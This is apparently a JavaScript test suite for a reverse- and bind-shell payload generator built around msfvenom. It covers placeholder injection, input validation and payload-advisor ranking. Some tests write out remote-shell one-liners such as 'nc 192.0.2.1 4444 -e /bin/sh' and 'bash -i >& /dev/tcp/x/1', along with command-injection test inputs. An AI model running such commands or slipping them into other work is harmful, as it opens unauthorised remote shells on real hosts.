import test from 'node:test'
import assert from 'node:assert/strict'

import {
  applyEncoding,
  injectPayloadValues,
} from '../src/utils/encoding.js'
import {
  quoteShellArg,
  validateBadChars,
  validateHost,
  validatePort,
} from '../src/utils/validation.js'
import {
  applyShellReplacement,
  detectPayloadInterpreter,
  supportsShellOverride,
} from '../src/utils/shells.js'
import {
  MSFVENOM_ENCODERS,
  MSFVENOM_FORMATS,
  MSFVENOM_PAYLOADS,
  generateMsfvenomCommand,
  getMsfvenomCompatibilityErrors,
  getMsfvenomListener,
  getMsfvenomPayloadTraits,
  isFormatCompatible,
} from '../src/data/msfvenomData.js'
import LINUX_PAYLOADS from '../src/data/payloadsLinux.js'
import WINDOWS_PAYLOADS from '../src/data/payloadsWindows.js'
import BIND_LINUX_PAYLOADS from '../src/data/payloadsBindLinux.js'
import BIND_WINDOWS_PAYLOADS from '../src/data/payloadsBindWindows.js'
import {
  getPayloadMetadataOverrides,
  VERIFIED_LINUX_RUNTIME_PAYLOADS,
} from '../src/data/payloadMetadataOverrides.js'
import {
  buildPayloadCatalog,
  buildPayloadMetadata,
  inferPayloadCategory,
  inferPayloadVerification,
  validatePayloadMetadata,
} from '../src/features/payloadAdvisor/payloadMetadata.js'
import {
  getAdvisorCapabilityOptions,
  getRequirementCapabilityIds,
  rankPayloads,
  requirementIsAvailable,
} from '../src/features/payloadAdvisor/advisorEngine.js'
import {
  buildPayloadExplanation,
  extractPayloadPlaceholders,
} from '../src/features/payloadExplanation/explanationEngine.js'

function encodePowerShellUtf16(value) {
  return Buffer.from(value, 'utf16le').toString('base64')
}

test('encodes Unicode payloads as UTF-8 Base64', () => {
  assert.equal(
    applyEncoding('δοκιμή', 'Base64'),
    Buffer.from('δοκιμή', 'utf8').toString('base64'),
  )
})

test('injects placeholders inside PowerShell EncodedCommand payloads', () => {
  const source = '$client.Connect("{ip}",{port})'
  const template = 'powershell -e ' + encodePowerShellUtf16(source)
  const injected = injectPayloadValues(template, '192.0.2.10', '4444')
  const decoded = Buffer.from(injected.split(' ').at(-1), 'base64').toString('utf16le')

  assert.equal(decoded, '$client.Connect("192.0.2.10",4444)')
})

test('renders every direct PowerShell template without unresolved placeholders', () => {
  const templates = [
    ...[
      'PowerShell #1',
      'PowerShell #2',
      'PowerShell #3 (Base64)',
      'PowerShell #4 (TCP)',
      'PowerShell #5 (IEX)',
    ].map(name => WINDOWS_PAYLOADS[name]),
    ...[
      'PowerShell Bind #1',
      'PowerShell Bind #2 (hidden)',
    ].map(name => BIND_WINDOWS_PAYLOADS[name]),
  ]

  for (const template of templates) {
    const rendered = injectPayloadValues(template, '127.0.0.1', '49152')
    assert.doesNotMatch(rendered, /\{(?:ip|port)\}/)
    assert.doesNotMatch(rendered, /\{\{|\}\}/)
  }

  const encoded = injectPayloadValues(
    WINDOWS_PAYLOADS['PowerShell #3 (Base64)'],
    '127.0.0.1',
    '49152',
  ).split(/\s+/).at(-1)
  const decoded = Buffer.from(encoded, 'base64').toString('utf16le')
  assert.match(decoded, /127\.0\.0\.1/)
  assert.match(decoded, /49152/)
  assert.doesNotMatch(decoded, /\{(?:ip|port)\}/)
})

test('normalizes legacy Python format-string braces once without collapsing nested blocks', () => {
  const renderedC = injectPayloadValues(LINUX_PAYLOADS.C, '192.0.2.10', '4444')
  const renderedCSharp = injectPayloadValues(
    LINUX_PAYLOADS['C# TCP Client'],
    '192.0.2.10',
    '4444',
  )
  const renderedGo = injectPayloadValues(LINUX_PAYLOADS.Golang, '192.0.2.10', '4444')
  const renderedBindGo = injectPayloadValues(
    BIND_LINUX_PAYLOADS['Golang Bind'],
    '192.0.2.10',
    '4444',
  )

  assert.match(renderedC, /int main\(void\)\{/)
  assert.match(renderedCSharp, /namespace ConnectBack \{/)
  assert.match(renderedGo, /func main\(\)\{/)
  assert.match(renderedBindGo, /c\.Write\(out\)\}\}/)
})

test('validates hosts and ports before payload generation', () => {
  assert.equal(validateHost('10.10.10.10'), '')
  assert.equal(validateHost('vpn.example.internal'), '')
  assert.match(validateHost('10.0.0.1; id'), /without spaces or shell characters/)
  assert.equal(validatePort('4444'), '')
  assert.match(validatePort('70000'), /between 1 and 65535/)
  assert.match(validatePort('4444 && id'), /number/)
})

test('validates bad-character syntax and safely quotes shell arguments', () => {
  assert.equal(validateBadChars('\\x00\\x0a'), '')
  assert.match(validateBadChars('\\x0z'), /byte escapes/)
  assert.equal(quoteShellArg('shell.exe'), 'shell.exe')
  assert.equal(quoteShellArg('my shell.exe'), "'my shell.exe'")
})

test('only applies shell overrides to portable payload templates', () => {
  const template = 'nc 192.0.2.1 4444 -e /bin/sh'
  assert.equal(supportsShellOverride(template, 'nc -e', 'Linux'), true)
  assert.equal(
    applyShellReplacement(template, '/bin/zsh', 'Linux'),
    'nc 192.0.2.1 4444 -e /bin/zsh',
  )
  assert.equal(supportsShellOverride('bash -i >& /dev/tcp/x/1', 'Bash -i', 'Linux'), false)
  assert.deepEqual(
    detectPayloadInterpreter('bash -i >& /dev/tcp/x/1', 'Bash -i', 'Linux'),
    { value: 'bash', label: 'Bash' },
  )
})

test('MSFVenom catalog contains no duplicate payload entries', () => {
  const payloads = Object.values(MSFVENOM_PAYLOADS)
    .flatMap(category => Object.values(category).flat())
  assert.equal(new Set(payloads).size, payloads.length)
  assert.equal(payloads.includes('linux/x64/meterpreter/reverse_https'), false)
  assert.equal(payloads.includes('osx/x64/shell/reverse_tcp'), false)
  assert.ok(payloads.includes('osx/x64/meterpreter/bind_tcp'))
})

test('MSFVenom formats and encoders match the pinned compatibility baseline', () => {
  const formats = Object.values(MSFVENOM_FORMATS)
    .flat()
    .map(format => format.value)
  const encoders = MSFVENOM_ENCODERS
    .map(encoder => encoder.value)
    .filter(Boolean)

  assert.equal(formats.length, 45)
  assert.equal(new Set(formats).size, formats.length)
  assert.equal(encoders.length, 15)
  assert.equal(new Set(encoders).size, encoders.length)

  for (const invalidFormat of ['apk', 'php', 'phtml', 'powershell_base64']) {
    assert.equal(formats.includes(invalidFormat), false)
  }
})

test('rejects incompatible MSFVenom combinations', () => {
  assert.equal(isFormatCompatible('windows/x64/meterpreter_reverse_tcp', 'exe'), true)
  assert.equal(isFormatCompatible('windows/x64/meterpreter_reverse_tcp', 'elf'), false)
  assert.equal(isFormatCompatible('php/meterpreter_reverse_tcp', 'raw'), true)
  assert.equal(isFormatCompatible('android/meterpreter/reverse_tcp', 'raw'), true)
  assert.match(
    getMsfvenomCompatibilityErrors({
      payload: 'windows/x64/meterpreter_reverse_tcp',
      format: 'exe',
      encoder: 'x86/shikata_ga_nai',
      arch: 'x86',
      platform: 'linux',
    }).encoder,
    /cannot encode/,
  )
})

test('quotes user-controlled MSFVenom output values', () => {
  const command = generateMsfvenomCommand({
    payload: 'windows/x64/meterpreter_reverse_tcp',
    ip: '192.0.2.10',
    port: '4444',
    format: 'exe',
    encoder: '',
    iterations: '1',
    badChars: '\\x00',
    arch: '',
    platform: '',
    nops: '0',
    outputFile: 'my shell.exe',
  })

  assert.match(command, /-b '\\x00'/)
  assert.match(command, /-o 'my shell\.exe'/)
})

test('uses multi/handler for staged and Meterpreter MSFVenom payloads', () => {
  const stagedShell = getMsfvenomListener({
    payload: 'linux/x86/shell/reverse_tcp',
    ip: '192.0.2.10',
    port: '4444',
  })
  assert.match(stagedShell, /use exploit\/multi\/handler/)
  assert.match(stagedShell, /set PAYLOAD linux\/x86\/shell\/reverse_tcp/)
  assert.match(stagedShell, /set LHOST 192\.0\.2\.10/)
  assert.match(stagedShell, /set LPORT 4444/)
  assert.equal(getMsfvenomPayloadTraits('linux/x86/shell/reverse_tcp').isStaged, true)

  const stagelessMeterpreter = getMsfvenomListener({
    payload: 'windows/x64/meterpreter_reverse_https',
    ip: '198.51.100.5',
    port: '8443',
  })
  assert.match(stagelessMeterpreter, /use exploit\/multi\/handler/)
  assert.equal(
    getMsfvenomPayloadTraits('windows/x64/meterpreter_reverse_https').isStaged,
    false,
  )

  const stagedBind = getMsfvenomListener({
    payload: 'linux/x64/shell/bind_tcp',
    ip: '203.0.113.8',
    port: '5555',
  })
  assert.match(stagedBind, /set RHOST 203\.0\.113\.8/)
  assert.doesNotMatch(stagedBind, /set LHOST/)
})

test('uses Netcat only for simple stageless command-shell payloads', () => {
  assert.equal(
    getMsfvenomListener({
      payload: 'linux/x64/shell_reverse_tcp',
      ip: '192.0.2.10',
      port: '9001',
    }),
    'nc -lvnp 9001',
  )
  assert.equal(
    getMsfvenomListener({
      payload: 'linux/x64/shell_bind_tcp',
      ip: '192.0.2.20',
      port: '9002',
    }),
    'nc 192.0.2.20 9002',
  )
})

test('builds deterministic metadata for fixed and portable shell payloads', () => {
  const bashMetadata = buildPayloadMetadata({
    name: 'Bash -i',
    template: LINUX_PAYLOADS['Bash -i'],
    os: 'Linux',
    mode: 'reverse',
  })
  const netcatMetadata = buildPayloadMetadata({
    name: 'nc -e',
    template: LINUX_PAYLOADS['nc -e'],
    os: 'Linux',
    mode: 'reverse',
  })

  assert.equal(bashMetadata.id, 'reverse:linux:Bash%20-i')
  assert.deepEqual(bashMetadata.interpreter, { value: 'bash', label: 'Bash' })
  assert.equal(bashMetadata.shellOverrideSupported, false)
  assert.ok(bashMetadata.requiredBinaries.includes('bash'))
  assert.match(bashMetadata.warnings.join(' '), /\/dev\/tcp/)

  assert.equal(netcatMetadata.category, 'Netcat')
  assert.equal(netcatMetadata.shellOverrideSupported, true)
  assert.ok(netcatMetadata.requiredBinaries.includes('nc'))
})

test('builds valid metadata for every selectable reverse and bind payload', () => {
  const catalog = buildPayloadCatalog([
    { payloads: LINUX_PAYLOADS, os: 'Linux', mode: 'reverse' },
    { payloads: WINDOWS_PAYLOADS, os: 'Windows', mode: 'reverse' },
    { payloads: BIND_LINUX_PAYLOADS, os: 'Linux', mode: 'bind' },
    { payloads: BIND_WINDOWS_PAYLOADS, os: 'Windows', mode: 'bind' },
  ])

  assert.equal(catalog.length, 111)
  assert.equal(new Set(catalog.map(item => item.id)).size, catalog.length)
  assert.equal(catalog.some(item => item.name === 'P0wny Shell (Webshell)'), false)
  assert.deepEqual(catalog.flatMap(validatePayloadMetadata), [])
  assert.equal(catalog.some(item => item.name === 'PHP exec'), false)
  assert.equal(catalog.some(item => item.name === 'curl'), false)
  assert.equal(catalog.some(item => item.name === 'PowerShell #5 (IEX)'), false)
  assert.equal(catalog.some(item => item.name === 'Mshta'), false)
  assert.equal(catalog.some(item => item.name === 'Regsvr32'), false)
  assert.ok(catalog.every(item => item.verification?.status))
})

test('uses the runtime required by Bash UDP and GNU Awk network payloads', () => {
  assert.match(LINUX_PAYLOADS['Bash udp'], /^bash -i/)
  assert.match(LINUX_PAYLOADS.Awk, /^gawk /)
  assert.match(BIND_LINUX_PAYLOADS['Awk Bind'], /^gawk /)

  const awkMetadata = buildPayloadMetadata({
    name: 'Awk',
    template: LINUX_PAYLOADS.Awk,
    os: 'Linux',
    mode: 'reverse',
  })
  assert.deepEqual(awkMetadata.requiredBinaries, ['gawk'])
  assert.match(awkMetadata.warnings.join(' '), /GNU Awk/)
})

test('keeps the Ruby reverse socket open across exec', () => {
  assert.match(LINUX_PAYLOADS['Ruby #1'], /\$stdin\.reopen\(c\)/)
  assert.match(LINUX_PAYLOADS['Ruby #1'], /\$stdout\.reopen\(c\)/)
  assert.doesNotMatch(LINUX_PAYLOADS['Ruby #1'], /\.to_i/)
})

test('classifies uncommon compiler payloads as experimental without claiming runtime verification', () => {
  assert.equal(inferPayloadVerification({ category: 'C' }).status, 'experimental')
  assert.equal(inferPayloadVerification({ category: 'Bash' }).status, 'conditional')

  const metadata = buildPayloadMetadata({
    name: 'Runtime verified sample',
    template: 'bash -c "echo {ip} {port}"',
    os: 'Linux',
    mode: 'reverse',
    overrides: {
      verification: {
        status: 'verified',
        basis: 'Executed in a controlled test fixture.',
        lastVerified: '2026-08-18',
        testedOn: ['test-fixture'],
      },
    },
  })

  assert.equal(metadata.verification.status, 'verified')
  assert.deepEqual(validatePayloadMetadata(metadata), [])
})

test('records only end-to-end Docker cases as runtime verified', () => {
  const catalog = buildPayloadCatalog([
    {
      payloads: LINUX_PAYLOADS,
      os: 'Linux',
      mode: 'reverse',
      overrides: getPayloadMetadataOverrides('Linux', 'reverse'),
    },
    {
      payloads: BIND_LINUX_PAYLOADS,
      os: 'Linux',
      mode: 'bind',
      overrides: getPayloadMetadataOverrides('Linux', 'bind'),
    },
  ])
  const verified = catalog.filter(payload => payload.verification.status === 'verified')
  const expectedCount = VERIFIED_LINUX_RUNTIME_PAYLOADS.reverse.length
    + VERIFIED_LINUX_RUNTIME_PAYLOADS.bind.length

  assert.equal(verified.length, expectedCount)
  assert.ok(verified.every(payload => payload.verification.lastVerified === '2026-08-18'))
  assert.ok(verified.every(payload => payload.verification.testedOn.length > 0))
  assert.equal(
    catalog.find(payload => payload.name === 'C')?.verification.status,
    'experimental',
  )
})

test('offers at least one selectable capability for every catalog requirement', () => {
  const sourcesByOs = {
    Linux: [
      { payloads: LINUX_PAYLOADS, os: 'Linux', mode: 'reverse' },
      { payloads: BIND_LINUX_PAYLOADS, os: 'Linux', mode: 'bind' },
    ],
    Windows: [
      { payloads: WINDOWS_PAYLOADS, os: 'Windows', mode: 'reverse' },
      { payloads: BIND_WINDOWS_PAYLOADS, os: 'Windows', mode: 'bind' },
    ],
  }

  for (const [os, sources] of Object.entries(sourcesByOs)) {
    const catalog = buildPayloadCatalog(sources)
    const capabilityIds = new Set(
      getAdvisorCapabilityOptions(os, catalog).map(option => option.id),
    )

    for (const payload of catalog) {
      for (const requirement of payload.requiredBinaries) {
        assert.equal(
          getRequirementCapabilityIds(requirement).some(id => capabilityIds.has(id)),
          true,
          `${payload.id} has no selectable capability for ${requirement}`,
        )
      }
    }
  }
})

test('metadata inference supports explicit overrides and rejects duplicate ids', () => {
  const metadata = buildPayloadMetadata({
    name: 'Custom TCP',
    template: 'custom-client {ip} {port}',
    os: 'Linux',
    mode: 'reverse',
    overrides: {
      category: 'Custom',
      requiredBinaries: ['custom-client'],
      explanation: { summary: 'A locally defined custom client.' },
    },
  })

  assert.equal(metadata.category, 'Custom')
  assert.deepEqual(metadata.requiredBinaries, ['custom-client'])
  assert.equal(metadata.explanation.summary, 'A locally defined custom client.')
  assert.equal(inferPayloadCategory('Unknown payload'), 'Other')

  assert.throws(() => buildPayloadCatalog([
    { payloads: { Duplicate: 'first {ip} {port}' }, os: 'Linux', mode: 'reverse' },
    { payloads: { Duplicate: 'second {ip} {port}' }, os: 'Linux', mode: 'reverse' },
  ]), /Duplicate payload metadata id/)
})

test('advisor ranks payloads by declared requirements deterministically', () => {
  const catalog = buildPayloadCatalog([
    { payloads: LINUX_PAYLOADS, os: 'Linux', mode: 'reverse' },
  ])
  const firstRun = rankPayloads(catalog, {
    transport: 'tcp',
    category: 'Bash',
    capabilities: ['bash'],
  })
  const secondRun = rankPayloads(catalog, {
    transport: 'tcp',
    category: 'Bash',
    capabilities: ['bash'],
  })
  const defaultRanking = rankPayloads(catalog)

  assert.ok(firstRun.length > 0)
  assert.equal(defaultRanking[0].payload.category, 'Bash')
  assert.deepEqual(
    firstRun.map(result => result.payload.id),
    secondRun.map(result => result.payload.id),
  )
  assert.equal(firstRun[0].status === 'unavailable', false)
})

test('advisor explains missing target requirements', () => {
  const catalog = [buildPayloadMetadata({
    name: 'nc -e',
    template: LINUX_PAYLOADS['nc -e'],
    os: 'Linux',
    mode: 'reverse',
  })]
  const [result] = rankPayloads(catalog, { capabilities: ['bash'] })

  assert.equal(result.status, 'unavailable')
  assert.ok(result.missingRequirements.includes('nc'))
  assert.match(result.cautions[0], /Missing/)
  assert.equal(requirementIsAvailable('python-or-python3', ['python3']), true)
})

test('advisor transport and category filters only return matching payloads', () => {
  const catalog = buildPayloadCatalog([
    { payloads: LINUX_PAYLOADS, os: 'Linux', mode: 'reverse' },
  ])
  const results = rankPayloads(catalog, { transport: 'udp', category: 'Bash' })

  assert.ok(results.length > 0)
  assert.ok(results.every(result => result.payload.transport === 'udp'))
  assert.ok(results.every(result => result.payload.category === 'Bash'))
})

test('advisor hides experimental payloads by default and can include them explicitly', () => {
  const catalog = buildPayloadCatalog([
    { payloads: LINUX_PAYLOADS, os: 'Linux', mode: 'reverse' },
  ])
  const recommended = rankPayloads(catalog)
  const all = rankPayloads(catalog, { maturity: 'all' })

  assert.ok(recommended.every(result => result.payload.verification.status !== 'experimental'))
  assert.ok(all.some(result => result.payload.verification.status === 'experimental'))
  assert.ok(all.length > recommended.length)
})

test('builds guided reverse payload explanations with placeholders and stabilization', () => {
  const metadata = buildPayloadMetadata({
    name: 'Bash -i',
    template: LINUX_PAYLOADS['Bash -i'],
    os: 'Linux',
    mode: 'reverse',
  })
  const explanation = buildPayloadExplanation(metadata, {
    listenerCommand: 'nc -lvnp 4444',
  })

  assert.deepEqual(extractPayloadPlaceholders(metadata.template), ['ip', 'port'])
  assert.match(explanation.direction, /outbound connection/)
  assert.equal(explanation.verification.status, 'conditional')
  assert.match(explanation.verification.basis, /runtime behavior depends/)
  assert.equal(explanation.workflow[0].command, 'nc -lvnp 4444')
  assert.equal(explanation.stabilization.length, 2)
  assert.match(explanation.troubleshooting, /\/dev\/tcp/)
})

test('builds bind explanations with the connect command in the correct workflow step', () => {
  const metadata = buildPayloadMetadata({
    name: 'nc bind',
    template: 'nc -lvnp {port} -e /bin/sh',
    os: 'Linux',
    mode: 'bind',
  })
  const explanation = buildPayloadExplanation(metadata, {
    listenerCommand: 'nc 192.0.2.10 4444',
  })

  assert.match(explanation.direction, /opens a listening port/)
  assert.equal(explanation.workflow[1].command, 'nc 192.0.2.10 4444')
  assert.deepEqual(explanation.stabilization, [])
})

test('marks external-resource and LOLBAS payloads experimental with explicit requirements', () => {
  const conPtyMetadata = buildPayloadMetadata({
    name: 'ConPtyShell',
    template: WINDOWS_PAYLOADS.ConPtyShell,
    os: 'Windows',
    mode: 'reverse',
  })
  const msBuildMetadata = buildPayloadMetadata({
    name: 'MSBuild',
    template: WINDOWS_PAYLOADS.MSBuild,
    os: 'Windows',
    mode: 'reverse',
  })

  assert.equal(conPtyMetadata.verification.status, 'experimental')
  assert.match(conPtyMetadata.warnings.join(' '), /Downloads a remote resource/)
  assert.equal(msBuildMetadata.verification.status, 'experimental')
  assert.ok(msBuildMetadata.requiredBinaries.includes('msbuild.exe'))
})
